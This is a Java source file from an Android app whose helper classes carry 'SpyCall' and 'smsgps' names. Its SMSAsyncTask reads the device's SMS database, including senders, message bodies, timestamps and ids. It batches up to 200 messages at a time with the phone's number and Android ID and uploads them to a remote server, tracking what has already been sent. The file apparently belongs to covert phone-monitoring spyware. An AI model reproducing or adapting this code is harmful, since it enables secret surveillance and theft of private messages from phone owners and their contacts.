/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class SMSAsyncTask extends AsyncTask<String, Void, String> {

	private Context ctx;
	private static final String TAG = "SMSAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;

	/**
	 * 
	 */
	public SMSAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}

	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {

		try{
			getSms();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedSMS();
		}

		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}

	class SMSPostAsyncTask extends AsyncTask<String, Void, Void> {

		String getResponceSMS;
		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {        
			try{					
				mRequestPostClass=new RequestPost();
				String getDeviceIDString=SpyCallSharedPrefrence.getsaveDEVICEID_Pre(ctx);
				//String getUserID_SP = SpyCallSharedPrefrence.getsaveUSER_ID(ctx);
				String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				//String deviceID = HinjAppPreferenceUtils.getDeviceId(ctx);
				String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
				
				String userId = HinjAppPreferenceUtils.getRaId(ctx);
				
				getResponceSMS= mRequestPostClass.postSmsPost(params[1],userId,android_id);

				JSONObject responseObject = new JSONObject(getResponceSMS);
				JSONArray responseArray = responseObject.getJSONArray("sms");
				if(responseArray.getJSONObject(0).toString().contains("success")){
					//Log.e("SMS SP_COUNT VALUE ",params[0]+"");
					SpyCallSharedPrefrence.saveSMS_PreCount(ctx, Integer.parseInt(params[0]));					
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			Log.i(TAG, getResponceSMS);
			//getCallDetails();
		} 
	}

	public void getSms()
	{
		String ADDRESS = "address";
		String DATE = "date";
		String TYPE = "type";
		String BODY = "body";
		String ID = "_id";
		int MESSAGE_TYPE_INBOX = 1;
		int MESSAGE_TYPE_SENT = 2;

		try{  	
			String smsDetail="";				    
			//********************
			ContentResolver contentResolver1 = ctx.getContentResolver();
			Cursor cursor1 = contentResolver1.query(Uri.parse("content://sms"),null, null, null,null);

			int PreSMSCount=SpyCallSharedPrefrence.getsaveSMS_PreCount(ctx);

			int getTotalCount=cursor1.getCount();
			Log.i("getTotalCount**********   ", ""+getTotalCount);
			int remaningSMS=getTotalCount-PreSMSCount;
			Log.i("remaningSMS**********   ", ""+remaningSMS);
			int pp=0;

			if(remaningSMS>200){
				pp=200;
			}
			else{
				pp=remaningSMS;
			}

			//********************
			ContentResolver contentResolver = ctx.getContentResolver();
			Cursor cursor = contentResolver.query(Uri.parse("content://sms"),null, null, null, DATE+" LIMIT "+PreSMSCount+","+pp);	
			int indexBody = cursor.getColumnIndex(BODY );
			int indexAddr = cursor.getColumnIndex(ADDRESS );
			int indextype = cursor.getColumnIndex(DATE );
			int type= cursor.getColumnIndex(TYPE );	
			int m_Id= cursor.getColumnIndex(ID);	

			if (null!=cursor){
				while(cursor.moveToNext()){														
					Long.parseLong(cursor.getString(indextype));
					//Log.i("sequremessage", cursor.getString(indextype));				
					String b=cursor.getString(indextype);
					if(b.equals("null")){
						Long.valueOf("1563423");
					}
					//l=l/1000;				
					//String a = "" + l;						
					long xyz=Long.valueOf(b);
					Timestamp st = new Timestamp(xyz);
					java.util.Date date1 = new java.util.Date(st.getTime());
					DateFormat df = DateFormat.getDateInstance();
					TimeZone zone1 = TimeZone.getTimeZone(df.getTimeZone().getID()); // For example...
					DateFormat format1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); // Put your pattern here
					format1.setTimeZone(zone1);
					String SMStime = format1.format(date1);
					
					String sent_inbox_status = "";
					if (cursor.getString(type).equals(String.valueOf(MESSAGE_TYPE_INBOX))) {
						sent_inbox_status = "1";
					} else if (cursor.getString(type).equals(String.valueOf(MESSAGE_TYPE_SENT))) {
						sent_inbox_status = "2";
					} else {
						Log.i("type*******************", cursor.getString(type));
						sent_inbox_status = "3";
						continue;
					}
					
					String smsId = cursor.getString(m_Id); 
					
					String MobileNo = SpyCallSharedPrefrence.getsaveMOBILE_NO(ctx);
					//String str1=cursor.getString( indexAddr )+"|||"+cursor.getString( indexBody )+"|||"+sent_inbox_status+"|||"+SMStime;
					String str1=MobileNo+"|||"+cursor.getString( indexAddr )+"|||"+cursor.getString( indexBody )+"|||"+
								sent_inbox_status+"|||"+SMStime+"|||"+smsId;
					//["3695847","121","0","2","2013-06-11 10:06:39"]
                    if(cursor.getString( indexBody ).length()!=0){ 
						if(smsDetail.length()!=0){
							smsDetail=str1+"##KM##"+smsDetail;
						}
						else{
							smsDetail=str1;
						}
                    }
					if(cursor.isFirst()){	
						String strLastSMSDetail=str1;
						Log.i(TAG, strLastSMSDetail);
						//Toast.makeText(getApplicationContext(), "strLastSMSDetail"+strLastSMSDetail, Toast.LENGTH_SHORT).show();
					}
				}	
				try{
					//Log.i("SMSCount ****************",SMSCount);

					if(Utility.isNetworkAvailable(ctx)){
						// new YourAsyncTask_SMS().execute(PreSMSCount+remaningSMS);
						Log.i(TAG, smsDetail);
						if(remaningSMS>0){
							int smsCount=PreSMSCount+pp;
							String getDeviceIDString = SpyCallSharedPrefrence.getsaveDEVICEID_Pre(ctx);
							new SMSPostAsyncTask().execute(smsCount+"",smsDetail,getDeviceIDString);
						}
					}
				}
				catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
				remaningSMS=0;
			}
		}
		catch (Exception e) {
			//getCallDetails();
			e.printStackTrace();
		}	

	}			
	
	 private String usingDateFormatter(long input){
			Calendar cal1 = Calendar.getInstance();
			TimeZone tz1 = cal1.getTimeZone();
			/* debug: is it local time? */
			Log.d("Time zone: ", tz1.getDisplayName());
			/* date formatter in local timezone */
			SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			sdf1.setTimeZone(tz1);
			/* print your timestamp and double check it's the date you expect */
			long timestamp1 = Long.valueOf(input);
			String getDatetime = sdf1.format(new Date(timestamp1 * 1000)); // I assume your timestamp is in seconds and you're converting to milliseconds		    
	        return getDatetime;
	 
	    }

}